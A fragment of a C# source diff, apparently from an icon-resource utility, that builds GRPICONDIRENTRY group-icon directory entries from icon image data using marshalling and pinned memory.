+                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
+                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
+                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
+                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
+                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
+                    pinnedBitmapInfoHeader.Free();
+                    grpEntry.Width = iconEntry[i].Width;
+                    grpEntry.Height = iconEntry[i].Height;
+                    grpEntry.ColorCount = iconEntry[i].ColorCount;
+                    grpEntry.Reserved = iconEntry[i].Reserved;
+                    grpEntry.Planes = bitmapheader.Planes;
+                    grpEntry.BitCount = bitmapheader.BitCount;
+                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
+                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
+                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
+                        false);
+                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
+                }
+                pinnedData.Free();
+                return data;
+            }
+        }
+
+
+    }
+}
